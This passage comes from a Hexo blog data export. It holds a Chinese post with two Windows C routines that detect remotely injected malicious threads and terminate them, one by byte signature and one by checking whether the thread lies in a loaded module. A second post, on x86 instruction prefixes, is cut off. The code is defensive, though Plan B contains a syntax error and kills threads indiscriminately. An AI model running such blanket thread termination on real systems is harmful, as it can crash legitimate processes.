检查入口地址是否位于某模块中\n\t\t\t\t\tGetMappedFileName(\n\t\t\t\t\t\t::OpenProcess(\t\t\t\t\t\t// 进程句柄\n\t\t\t\t\t\tPROCESS_ALL_ACCESS,\t\t\t\t\t\t\t\t\t// 访问权限，THREAD_ALL_ACCESS ：所有权限\n\t\t\t\t\t\tFALSE,\t\t\t\t\t\t\t\t\t\t\t\t// 由此线程创建的进程不继承线程的句柄\n\t\t\t\t\t\t(DWORD)tbi.ClientId.UniqueProcess\t\t\t\t\t// 唯一进程 ID\n\t\t\t\t\t\t),\n\t\t\t\t\t\tstartaddr,\t\t\t\t\t\t\t// 要检查的地址\n\t\t\t\t\t\tmodname,\t\t\t\t\t\t\t// 用来接收模块名的指针\n\t\t\t\t\t\tMAX_PATH\t\t\t\t\t\t\t// 缓冲区大小\n\t\t\t\t\t\t);\n\n\t\t\t\t\t// 判断线程是否在模块中\n\n\t\t\t\t\tif (modname[0] == NULL)\n\t\t\t\t\t{\t\t\t\n                        //modname是模块名的指针，可以比较是否是恶意模块名\n\t\t\t\t\t\tprintf(\"线程不在模块中: th32ProcessID=%d, TID=%d  \\n\", process.th32ProcessID, te32.th32ThreadID);\n\t\t\t\t\t\tif (TerminateThread(hThread, -1))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tprintf(\"线程已被清理\\n\");\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tmodname[0] = NULL;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tFlag -= 1;\n\t}\n}\n```\n\n\n如果病毒还有提权操作的话，我们也需要提高权限去对抗\n\n常见的提权方式为调整令牌 详见\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/监控线程.md","raw":"---\ntitle: 恶意线程清理\ntags: [逆向]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121437.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/lmg/20191216121437.png\ndate: 2019-11-07 21:28:01\n---\n\n这篇博客的背景是：如果很多进程都恶意程序通过远进程注入了线程，那么应该怎么清除呢？\n\n下面给出两种方法\n\n## PLAN A\n来自 加号\n\n通过遍历线程后，根据获取到的线程信息，对线程地址和入口代码进行检查，这种方式适合对注入代码偏移位置固定或则入口代码固定，能准确查杀，推荐使用\n\n```C\nvoid Killing::KillMalRemoteThread()\n{\n\t(FARPROC&)ZwQueryInformationThread = GetProcAddress(m_hNtdll, \"ZwQueryInformationThread\");\n\n\tHANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n\tTHREADENTRY32 te32;\n\n\tte32.dwSize = sizeof(THREADENTRY32);\n\tThread32First(hThreadSnap, &te32);\n\tHANDLE hThread;\n\tdo {\n\t\thThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID);\n\n\t\tsetlocale(LC_ALL, \".ACP\");\n\n\t\tDWORD startAddr;\n\t\tZwQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &startAddr, sizeof(PVOID), NULL);\n\n\t\tprintf(\"进程 %d, 线程 %d, 入口地址 0x%x\\n\", te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n\n\t\tif (startAddr > 0x400000 && startAddr < 0x80000000)\n\t\t{\n\t\t\tif ((startAddr & 0xFFFF) == 0x3A72 || (startAddr & 0xFFFF) == 0x36F4)//判断进程入口地址2字节\n\t\t\t{\n\t\t\t\tPBYTE pbMapBase = (PBYTE)((startAddr & 0xFFFF) == 0x3A72 ? startAddr - 0x3A72 : startAddr - 0x36F4);\n\t\t\t\tHANDLE hOwnerProc = OpenProcess(PROCESS_VM_READ, false, te32.th32OwnerProcessID);\n\n\t\t\t\tBYTE sectionOff_0[4] = { 0 };\n\t\t\t\tBYTE sectionOff_2F8[5] = { 0 };\n\t\t\t\tReadProcessMemory(hOwnerProc, pbMapBase, sectionOff_0, 4, NULL);\n\t\t\t\tReadProcessMemory(hOwnerProc, pbMapBase + 0x2F8, sectionOff_2F8, 5, NULL);\n\n\t\t\t\tif (*(DWORD*)& sectionOff_0 == 0xFF243C83 &&\n\t\t\t\t\t*(DWORD*)& sectionOff_2F8 == 0x00012DE9 &&\n\t\t\t\t\tsectionOff_2F8[4] == 0x00)//进一步检查入口代码是否为特定值\n\t\t\t\t{\n\t\t\t\t\tprintf(\"########\\n恶意线程，在进程 %d, 线程 %d, 入口地址 0x%x\\n\", te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n\t\t\t\t\tif (TerminateThread(hThread, -1))\n\t\t\t\t\t{\n\t\t\t\t\t\tprintf(\"已终止该线程\\n\");\n\t\t\t\t\t}\n\t\t\t\t\tprintf(\"########\\n\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tCloseHandle(hThread);\n\n\t} while (Thread32Next(hThreadSnap, &te32));\n\n\tCloseHandle(hThreadSnap);\n}\n\n```\n\n## PLAN B\n\n而这个方案就比较猛一些，可以直接干掉所有不在模块中的线程，要小心一点\n\n因为普通线程创建都会在进程的已知模块中，而恶意代码创建的就是不属于任何模块，也可以用过指定模块名来关闭线程\n\n```C\nvoid WINAPI ClearThread()\n{\n\tint Flag = 3;\n\n\twhile (Flag)\n\t{\n\t\tSleep(1000);\n\t\tHANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\t// 进程快照句柄\n\t\tPROCESSENTRY32 process = { sizeof(PROCESSENTRY32) };\t\t\t\t\t\t// 进程快照信息\n\n\t\t// 遍历进程\n\t\twhile (Process32Next(hProcessSnap, &process))\n\t\tth32ProcessID{\n\t\t\tHANDLE hThreadSnap = INVALID_HANDLE_VALUE;\t\t\t// 线程快照句柄 \n\t\t\tTHREADENTRY32 te32;\t\t\t\t\t\t\t\t\t// 线程快照信息\n\t\t\t// 创建线程快照\n\t\t\thThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n\t\t\tif (hThreadSnap == INVALID_HANDLE_VALUE) { printf(\"创建线程快照失败\"); }\n\n\t\t\t// 为快照分派内存空间\n\t\t\tte32.dwSize = sizeof(THREADENTRY32);\n\n\t\t\t// 获取第一个线程的信息\n\t\t\tif (!Thread32First(hThreadSnap, &te32)) { printf(\"线程信息获取失败\"); }\n\n\t\t\t// 遍历线程\n\t\t\twhile (Thread32Next(hThreadSnap, &te32))\n\t\t\t{\n\t\t\t\tif (te32.th32OwnerProcessID == process.th32ProcessID)\n\t\t\t\t{\n\t\t\t\t\t// 打开线程\n\t\t\t\t\t//printf(\"PID=%d, TID=%d\\n\",te32.th32OwnerProcessID,te32.th32ThreadID);\n\n\t\t\t\t\tHANDLE hThread = ::OpenThread(\n\t\t\t\t\t\tTHREAD_ALL_ACCESS,\t\t// 访问权限，THREAD_ALL_ACCESS ：所有权限\n\t\t\t\t\t\tFALSE,\t\t\t\t\t// 由此线程创建的进程不继承线程的句柄\n\t\t\t\t\t\tte32.th32ThreadID\t\t// 线程 ID\n\t\t\t\t\t\t);\n\t\t\t\t\tif (hThread == NULL) \n\t\t\t\t\t{ \n\t\t\t\t\t\t//printf(\"线程打开失败%x\\n\", GetLastError()); \n\t\t\t\t\t\tcontinue; \n\t\t\t\t\t}\n\n\t\t\t\t\t// 将区域设置设置为从操作系统获取的ANSI代码页\n\t\t\t\t\tsetlocale(LC_ALL, \".ACP\");\n\n\t\t\t\t\t// 获取 ntdll.dll 的模块句柄\n\t\t\t\t\tHINSTANCE hNTDLL = ::GetModuleHandleA(\"ntdll\");\n\n\t\t\t\t\t// 从 ntdll.dll 中取出 ZwQueryInformationThread\n\t\t\t\t\t(FARPROC&)ZwQueryInformationThread = ::GetProcAddress(hNTDLL, \"ZwQueryInformationThread\");\n\n\t\t\t\t\t// 获取线程入口地址\n\t\t\t\t\tPVOID startaddr;\t\t\t\t\t\t// 用来接收线程入口地址\n\t\t\t\t\tZwQueryInformationThread(\n\t\t\t\t\t\thThread,\t\t\t\t\t\t\t// 线程句柄\n\t\t\t\t\t\tThreadQuerySetWin32StartAddress,\t// 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址\n\t\t\t\t\t\t&startaddr,\t\t\t\t\t\t\t// 指向缓冲区的指针\n\t\t\t\t\t\tsizeof(startaddr),\t\t\t\t\t// 缓冲区的大小\n\t\t\t\t\t\tNULL\n\t\t\t\t\t\t);\n\n\t\t\t\t\t// 获取线程所在模块\n\t\t\t\t\tTHREAD_BASIC_INFORMATION tbi;\t\t\t// _THREAD_BASIC_INFORMATION 结构体对象\n\t\t\t\t\tTCHAR modname[MAX_PATH];\t\t\t\t// 用来接收模块全路径\n\t\t\t\t\tZwQueryInformationThread(\n\t\t\t\t\t\thThread,\t\t\t\t\t\t\t// 线程句柄\n\t\t\t\t\t\tThreadBasicInformation,\t\t\t\t// 线程信息类型，ThreadBasicInformation ：线程基本信息\n\t\t\t\t\t\t&tbi,\t\t\t\t\t\t\t\t// 指向缓冲区的指针\n\t\t\t\t\t\tsizeof(tbi),\t\t\t\t\t\t// 缓冲区的大小\n\t\t\t\t\t\tNULL\n\t\t\t\t\t\t);\n\n\t\t\t\t\t// 检查入口地址是否位于某模块中\n\t\t\t\t\tGetMappedFileName(\n\t\t\t\t\t\t::OpenProcess(\t\t\t\t\t\t// 进程句柄\n\t\t\t\t\t\tPROCESS_ALL_ACCESS,\t\t\t\t\t\t\t\t\t// 访问权限，THREAD_ALL_ACCESS ：所有权限\n\t\t\t\t\t\tFALSE,\t\t\t\t\t\t\t\t\t\t\t\t// 由此线程创建的进程不继承线程的句柄\n\t\t\t\t\t\t(DWORD)tbi.ClientId.UniqueProcess\t\t\t\t\t// 唯一进程 ID\n\t\t\t\t\t\t),\n\t\t\t\t\t\tstartaddr,\t\t\t\t\t\t\t// 要检查的地址\n\t\t\t\t\t\tmodname,\t\t\t\t\t\t\t// 用来接收模块名的指针\n\t\t\t\t\t\tMAX_PATH\t\t\t\t\t\t\t// 缓冲区大小\n\t\t\t\t\t\t);\n\n\t\t\t\t\t// 判断线程是否在模块中\n\n\t\t\t\t\tif (modname[0] == NULL)\n\t\t\t\t\t{\t\t\t\n                        //modname是模块名的指针，可以比较是否是恶意模块名\n\t\t\t\t\t\tprintf(\"线程不在模块中: th32ProcessID=%d, TID=%d  \\n\", process.th32ProcessID, te32.th32ThreadID);\n\t\t\t\t\t\tif (TerminateThread(hThread, -1))\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tprintf(\"线程已被清理\\n\");\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\tmodname[0] = NULL;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tFlag -= 1;\n\t}\n}\n```\n\n\n如果病毒还有提权操作的话，我们也需要提高权限去对抗\n\n常见的提权方式为调整令牌 详见\n\n\n\n\n\n\n\n\n\n\n","slug":"监控线程","published":1,"updated":"2019-12-16T04:15:00.195Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw6360020ccuqu7nn81do","content":"<p>这篇博客的背景是：如果很多进程都恶意程序通过远进程注入了线程，那么应该怎么清除呢？</p>\n<p>下面给出两种方法</p>\n<h2 id=\"PLAN-A\"><a href=\"#PLAN-A\" class=\"headerlink\" title=\"PLAN A\"></a>PLAN A</h2><p>来自 加号</p>\n<p>通过遍历线程后，根据获取到的线程信息，对线程地址和入口代码进行检查，这种方式适合对注入代码偏移位置固定或则入口代码固定，能准确查杀，推荐使用</p>\n<pre><code class=\"C\">void Killing::KillMalRemoteThread()\n{\n    (FARPROC&amp;)ZwQueryInformationThread = GetProcAddress(m_hNtdll, &quot;ZwQueryInformationThread&quot;);\n\n    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    THREADENTRY32 te32;\n\n    te32.dwSize = sizeof(THREADENTRY32);\n    Thread32First(hThreadSnap, &amp;te32);\n    HANDLE hThread;\n    do {\n        hThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID);\n\n        setlocale(LC_ALL, &quot;.ACP&quot;);\n\n        DWORD startAddr;\n        ZwQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &amp;startAddr, sizeof(PVOID), NULL);\n\n        printf(&quot;进程 %d, 线程 %d, 入口地址 0x%x\\n&quot;, te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n\n        if (startAddr &gt; 0x400000 &amp;&amp; startAddr &lt; 0x80000000)\n        {\n            if ((startAddr &amp; 0xFFFF) == 0x3A72 || (startAddr &amp; 0xFFFF) == 0x36F4)//判断进程入口地址2字节\n            {\n                PBYTE pbMapBase = (PBYTE)((startAddr &amp; 0xFFFF) == 0x3A72 ? startAddr - 0x3A72 : startAddr - 0x36F4);\n                HANDLE hOwnerProc = OpenProcess(PROCESS_VM_READ, false, te32.th32OwnerProcessID);\n\n                BYTE sectionOff_0[4] = { 0 };\n                BYTE sectionOff_2F8[5] = { 0 };\n                ReadProcessMemory(hOwnerProc, pbMapBase, sectionOff_0, 4, NULL);\n                ReadProcessMemory(hOwnerProc, pbMapBase + 0x2F8, sectionOff_2F8, 5, NULL);\n\n                if (*(DWORD*)&amp; sectionOff_0 == 0xFF243C83 &amp;&amp;\n                    *(DWORD*)&amp; sectionOff_2F8 == 0x00012DE9 &amp;&amp;\n                    sectionOff_2F8[4] == 0x00)//进一步检查入口代码是否为特定值\n                {\n                    printf(&quot;########\\n恶意线程，在进程 %d, 线程 %d, 入口地址 0x%x\\n&quot;, te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n                    if (TerminateThread(hThread, -1))\n                    {\n                        printf(&quot;已终止该线程\\n&quot;);\n                    }\n                    printf(&quot;########\\n&quot;);\n                }\n            }\n        }\n        CloseHandle(hThread);\n\n    } while (Thread32Next(hThreadSnap, &amp;te32));\n\n    CloseHandle(hThreadSnap);\n}\n</code></pre>\n<h2 id=\"PLAN-B\"><a href=\"#PLAN-B\" class=\"headerlink\" title=\"PLAN B\"></a>PLAN B</h2><p>而这个方案就比较猛一些，可以直接干掉所有不在模块中的线程，要小心一点</p>\n<p>因为普通线程创建都会在进程的已知模块中，而恶意代码创建的就是不属于任何模块，也可以用过指定模块名来关闭线程</p>\n<pre><code class=\"C\">void WINAPI ClearThread()\n{\n    int Flag = 3;\n\n    while (Flag)\n    {\n        Sleep(1000);\n        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 进程快照句柄\n        PROCESSENTRY32 process = { sizeof(PROCESSENTRY32) };                        // 进程快照信息\n\n        // 遍历进程\n        while (Process32Next(hProcessSnap, &amp;process))\n        th32ProcessID{\n            HANDLE hThreadSnap = INVALID_HANDLE_VALUE;            // 线程快照句柄 \n            THREADENTRY32 te32;                                    // 线程快照信息\n            // 创建线程快照\n            hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n            if (hThreadSnap == INVALID_HANDLE_VALUE) { printf(&quot;创建线程快照失败&quot;); }\n\n            // 为快照分派内存空间\n            te32.dwSize = sizeof(THREADENTRY32);\n\n            // 获取第一个线程的信息\n            if (!Thread32First(hThreadSnap, &amp;te32)) { printf(&quot;线程信息获取失败&quot;); }\n\n            // 遍历线程\n            while (Thread32Next(hThreadSnap, &amp;te32))\n            {\n                if (te32.th32OwnerProcessID == process.th32ProcessID)\n                {\n                    // 打开线程\n                    //printf(&quot;PID=%d, TID=%d\\n&quot;,te32.th32OwnerProcessID,te32.th32ThreadID);\n\n                    HANDLE hThread = ::OpenThread(\n                        THREAD_ALL_ACCESS,        // 访问权限，THREAD_ALL_ACCESS ：所有权限\n                        FALSE,                    // 由此线程创建的进程不继承线程的句柄\n                        te32.th32ThreadID        // 线程 ID\n                        );\n                    if (hThread == NULL) \n                    { \n                        //printf(&quot;线程打开失败%x\\n&quot;, GetLastError()); \n                        continue; \n                    }\n\n                    // 将区域设置设置为从操作系统获取的ANSI代码页\n                    setlocale(LC_ALL, &quot;.ACP&quot;);\n\n                    // 获取 ntdll.dll 的模块句柄\n                    HINSTANCE hNTDLL = ::GetModuleHandleA(&quot;ntdll&quot;);\n\n                    // 从 ntdll.dll 中取出 ZwQueryInformationThread\n                    (FARPROC&amp;)ZwQueryInformationThread = ::GetProcAddress(hNTDLL, &quot;ZwQueryInformationThread&quot;);\n\n                    // 获取线程入口地址\n                    PVOID startaddr;                        // 用来接收线程入口地址\n                    ZwQueryInformationThread(\n                        hThread,                            // 线程句柄\n                        ThreadQuerySetWin32StartAddress,    // 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址\n                        &amp;startaddr,                            // 指向缓冲区的指针\n                        sizeof(startaddr),                    // 缓冲区的大小\n                        NULL\n                        );\n\n                    // 获取线程所在模块\n                    THREAD_BASIC_INFORMATION tbi;            // _THREAD_BASIC_INFORMATION 结构体对象\n                    TCHAR modname[MAX_PATH];                // 用来接收模块全路径\n                    ZwQueryInformationThread(\n                        hThread,                            // 线程句柄\n                        ThreadBasicInformation,                // 线程信息类型，ThreadBasicInformation ：线程基本信息\n                        &amp;tbi,                                // 指向缓冲区的指针\n                        sizeof(tbi),                        // 缓冲区的大小\n                        NULL\n                        );\n\n                    // 检查入口地址是否位于某模块中\n                    GetMappedFileName(\n                        ::OpenProcess(                        // 进程句柄\n                        PROCESS_ALL_ACCESS,                                    // 访问权限，THREAD_ALL_ACCESS ：所有权限\n                        FALSE,                                                // 由此线程创建的进程不继承线程的句柄\n                        (DWORD)tbi.ClientId.UniqueProcess                    // 唯一进程 ID\n                        ),\n                        startaddr,                            // 要检查的地址\n                        modname,                            // 用来接收模块名的指针\n                        MAX_PATH                            // 缓冲区大小\n                        );\n\n                    // 判断线程是否在模块中\n\n                    if (modname[0] == NULL)\n                    {            \n                        //modname是模块名的指针，可以比较是否是恶意模块名\n                        printf(&quot;线程不在模块中: th32ProcessID=%d, TID=%d  \\n&quot;, process.th32ProcessID, te32.th32ThreadID);\n                        if (TerminateThread(hThread, -1))\n                        {\n                            printf(&quot;线程已被清理\\n&quot;);\n                        }\n                    }\n                    modname[0] = NULL;\n                }\n            }\n        }\n        Flag -= 1;\n    }\n}</code></pre>\n<p>如果病毒还有提权操作的话，我们也需要提高权限去对抗</p>\n<p>常见的提权方式为调整令牌 详见</p>\n","site":{"data":{}},"excerpt":"","more":"<p>这篇博客的背景是：如果很多进程都恶意程序通过远进程注入了线程，那么应该怎么清除呢？</p>\n<p>下面给出两种方法</p>\n<h2 id=\"PLAN-A\"><a href=\"#PLAN-A\" class=\"headerlink\" title=\"PLAN A\"></a>PLAN A</h2><p>来自 加号</p>\n<p>通过遍历线程后，根据获取到的线程信息，对线程地址和入口代码进行检查，这种方式适合对注入代码偏移位置固定或则入口代码固定，能准确查杀，推荐使用</p>\n<pre><code class=\"C\">void Killing::KillMalRemoteThread()\n{\n    (FARPROC&amp;)ZwQueryInformationThread = GetProcAddress(m_hNtdll, &quot;ZwQueryInformationThread&quot;);\n\n    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n    THREADENTRY32 te32;\n\n    te32.dwSize = sizeof(THREADENTRY32);\n    Thread32First(hThreadSnap, &amp;te32);\n    HANDLE hThread;\n    do {\n        hThread = OpenThread(THREAD_ALL_ACCESS, false, te32.th32ThreadID);\n\n        setlocale(LC_ALL, &quot;.ACP&quot;);\n\n        DWORD startAddr;\n        ZwQueryInformationThread(hThread, ThreadQuerySetWin32StartAddress, &amp;startAddr, sizeof(PVOID), NULL);\n\n        printf(&quot;进程 %d, 线程 %d, 入口地址 0x%x\\n&quot;, te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n\n        if (startAddr &gt; 0x400000 &amp;&amp; startAddr &lt; 0x80000000)\n        {\n            if ((startAddr &amp; 0xFFFF) == 0x3A72 || (startAddr &amp; 0xFFFF) == 0x36F4)//判断进程入口地址2字节\n            {\n                PBYTE pbMapBase = (PBYTE)((startAddr &amp; 0xFFFF) == 0x3A72 ? startAddr - 0x3A72 : startAddr - 0x36F4);\n                HANDLE hOwnerProc = OpenProcess(PROCESS_VM_READ, false, te32.th32OwnerProcessID);\n\n                BYTE sectionOff_0[4] = { 0 };\n                BYTE sectionOff_2F8[5] = { 0 };\n                ReadProcessMemory(hOwnerProc, pbMapBase, sectionOff_0, 4, NULL);\n                ReadProcessMemory(hOwnerProc, pbMapBase + 0x2F8, sectionOff_2F8, 5, NULL);\n\n                if (*(DWORD*)&amp; sectionOff_0 == 0xFF243C83 &amp;&amp;\n                    *(DWORD*)&amp; sectionOff_2F8 == 0x00012DE9 &amp;&amp;\n                    sectionOff_2F8[4] == 0x00)//进一步检查入口代码是否为特定值\n                {\n                    printf(&quot;########\\n恶意线程，在进程 %d, 线程 %d, 入口地址 0x%x\\n&quot;, te32.th32OwnerProcessID, te32.th32ThreadID, startAddr);\n                    if (TerminateThread(hThread, -1))\n                    {\n                        printf(&quot;已终止该线程\\n&quot;);\n                    }\n                    printf(&quot;########\\n&quot;);\n                }\n            }\n        }\n        CloseHandle(hThread);\n\n    } while (Thread32Next(hThreadSnap, &amp;te32));\n\n    CloseHandle(hThreadSnap);\n}\n</code></pre>\n<h2 id=\"PLAN-B\"><a href=\"#PLAN-B\" class=\"headerlink\" title=\"PLAN B\"></a>PLAN B</h2><p>而这个方案就比较猛一些，可以直接干掉所有不在模块中的线程，要小心一点</p>\n<p>因为普通线程创建都会在进程的已知模块中，而恶意代码创建的就是不属于任何模块，也可以用过指定模块名来关闭线程</p>\n<pre><code class=\"C\">void WINAPI ClearThread()\n{\n    int Flag = 3;\n\n    while (Flag)\n    {\n        Sleep(1000);\n        HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);    // 进程快照句柄\n        PROCESSENTRY32 process = { sizeof(PROCESSENTRY32) };                        // 进程快照信息\n\n        // 遍历进程\n        while (Process32Next(hProcessSnap, &amp;process))\n        th32ProcessID{\n            HANDLE hThreadSnap = INVALID_HANDLE_VALUE;            // 线程快照句柄 \n            THREADENTRY32 te32;                                    // 线程快照信息\n            // 创建线程快照\n            hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);\n            if (hThreadSnap == INVALID_HANDLE_VALUE) { printf(&quot;创建线程快照失败&quot;); }\n\n            // 为快照分派内存空间\n            te32.dwSize = sizeof(THREADENTRY32);\n\n            // 获取第一个线程的信息\n            if (!Thread32First(hThreadSnap, &amp;te32)) { printf(&quot;线程信息获取失败&quot;); }\n\n            // 遍历线程\n            while (Thread32Next(hThreadSnap, &amp;te32))\n            {\n                if (te32.th32OwnerProcessID == process.th32ProcessID)\n                {\n                    // 打开线程\n                    //printf(&quot;PID=%d, TID=%d\\n&quot;,te32.th32OwnerProcessID,te32.th32ThreadID);\n\n                    HANDLE hThread = ::OpenThread(\n                        THREAD_ALL_ACCESS,        // 访问权限，THREAD_ALL_ACCESS ：所有权限\n                        FALSE,                    // 由此线程创建的进程不继承线程的句柄\n                        te32.th32ThreadID        // 线程 ID\n                        );\n                    if (hThread == NULL) \n                    { \n                        //printf(&quot;线程打开失败%x\\n&quot;, GetLastError()); \n                        continue; \n                    }\n\n                    // 将区域设置设置为从操作系统获取的ANSI代码页\n                    setlocale(LC_ALL, &quot;.ACP&quot;);\n\n                    // 获取 ntdll.dll 的模块句柄\n                    HINSTANCE hNTDLL = ::GetModuleHandleA(&quot;ntdll&quot;);\n\n                    // 从 ntdll.dll 中取出 ZwQueryInformationThread\n                    (FARPROC&amp;)ZwQueryInformationThread = ::GetProcAddress(hNTDLL, &quot;ZwQueryInformationThread&quot;);\n\n                    // 获取线程入口地址\n                    PVOID startaddr;                        // 用来接收线程入口地址\n                    ZwQueryInformationThread(\n                        hThread,                            // 线程句柄\n                        ThreadQuerySetWin32StartAddress,    // 线程信息类型，ThreadQuerySetWin32StartAddress ：线程入口地址\n                        &amp;startaddr,                            // 指向缓冲区的指针\n                        sizeof(startaddr),                    // 缓冲区的大小\n                        NULL\n                        );\n\n                    // 获取线程所在模块\n                    THREAD_BASIC_INFORMATION tbi;            // _THREAD_BASIC_INFORMATION 结构体对象\n                    TCHAR modname[MAX_PATH];                // 用来接收模块全路径\n                    ZwQueryInformationThread(\n                        hThread,                            // 线程句柄\n                        ThreadBasicInformation,                // 线程信息类型，ThreadBasicInformation ：线程基本信息\n                        &amp;tbi,                                // 指向缓冲区的指针\n                        sizeof(tbi),                        // 缓冲区的大小\n                        NULL\n                        );\n\n                    // 检查入口地址是否位于某模块中\n                    GetMappedFileName(\n                        ::OpenProcess(                        // 进程句柄\n                        PROCESS_ALL_ACCESS,                                    // 访问权限，THREAD_ALL_ACCESS ：所有权限\n                        FALSE,                                                // 由此线程创建的进程不继承线程的句柄\n                        (DWORD)tbi.ClientId.UniqueProcess                    // 唯一进程 ID\n                        ),\n                        startaddr,                            // 要检查的地址\n                        modname,                            // 用来接收模块名的指针\n                        MAX_PATH                            // 缓冲区大小\n                        );\n\n                    // 判断线程是否在模块中\n\n                    if (modname[0] == NULL)\n                    {            \n                        //modname是模块名的指针，可以比较是否是恶意模块名\n                        printf(&quot;线程不在模块中: th32ProcessID=%d, TID=%d  \\n&quot;, process.th32ProcessID, te32.th32ThreadID);\n                        if (TerminateThread(hThread, -1))\n                        {\n                            printf(&quot;线程已被清理\\n&quot;);\n                        }\n                    }\n                    modname[0] = NULL;\n                }\n            }\n        }\n        Flag -= 1;\n    }\n}</code></pre>\n<p>如果病毒还有提权操作的话，我们也需要提高权限去对抗</p>\n<p>常见的提权方式为调整令牌 详见</p>\n"},{"title":"Inter 汇编基础","index_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302105728.png","banner_img":"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302105728.png","_content":"\n\n\nhttps://bbs.pediy.com/thread-77508.htm\nhttps://blog.csdn.net/Apollon_krj/article/details/77524601\nx86指令集设计上就只允许是寄存器和寄存器或寄存器和内存间移动\n\nx86 profix:\n26：在指令序列里是：prefix部分，作用是调整内存操作数的段选择子\n66：在指令序列里是：prefix 部分，作用是调整操作数的缺省大小\n2E: CS\n3E: DS\n26: ES\n64: FS\n65: GS\n36: SS\nF0: locl指令\nF2: repne\nF3: rep repz\n\n\n![20200214220708.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214220708.png)\n\n![20200214221252.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221252.png)\n\n![20200214221520.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221520.png)\n\n![20200215175201.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175201.png)\n\n![20200215174932.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215174932.png)\n\n![20200215175337.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175337.png)","source":"_posts/深入浅出汇编.md","raw":"---\ntitle: Inter 汇编基础\ntags: [汇编]\nindex_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302105728.png\nbanner_img: https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200302105728.png\n---\n\n\n\nhttps://bbs.pediy.com/thread-77508.htm\nhttps://blog.csdn.net/Apollon_krj/article/details/77524601\nx86指令集设计上就只允许是寄存器和寄存器或寄存器和内存间移动\n\nx86 profix:\n26：在指令序列里是：prefix部分，作用是调整内存操作数的段选择子\n66：在指令序列里是：prefix 部分，作用是调整操作数的缺省大小\n2E: CS\n3E: DS\n26: ES\n64: FS\n65: GS\n36: SS\nF0: locl指令\nF2: repne\nF3: rep repz\n\n\n![20200214220708.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214220708.png)\n\n![20200214221252.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221252.png)\n\n![20200214221520.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221520.png)\n\n![20200215175201.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175201.png)\n\n![20200215174932.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215174932.png)\n\n![20200215175337.png](https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200215175337.png)","slug":"深入浅出汇编","published":1,"date":"2020-02-14T09:07:06.360Z","updated":"2020-03-18T01:53:51.867Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckhiiw63c0024ccuqj4imdrpd","content":"<p><a href=\"https://bbs.pediy.com/thread-77508.htm\" target=\"_blank\" rel=\"noopener\">https://bbs.pediy.com/thread-77508.htm</a><br><a href=\"https://blog.csdn.net/Apollon_krj/article/details/77524601\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/Apollon_krj/article/details/77524601</a><br>x86指令集设计上就只允许是寄存器和寄存器或寄存器和内存间移动</p>\n<p>x86 profix:<br>26：在指令序列里是：prefix部分，作用是调整内存操作数的段选择子<br>66：在指令序列里是：prefix 部分，作用是调整操作数的缺省大小<br>2E: CS<br>3E: DS<br>26: ES<br>64: FS<br>65: GS<br>36: SS<br>F0: locl指令<br>F2: repne<br>F3: rep repz</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214220708.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200214220708.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221252.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200214221252.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/L0yy/tuchuang/Img/20200214221520.png\" srcset=\"/cray/img/loading.gif\" alt=\"20200214221520.png\"></p>\n<p><img 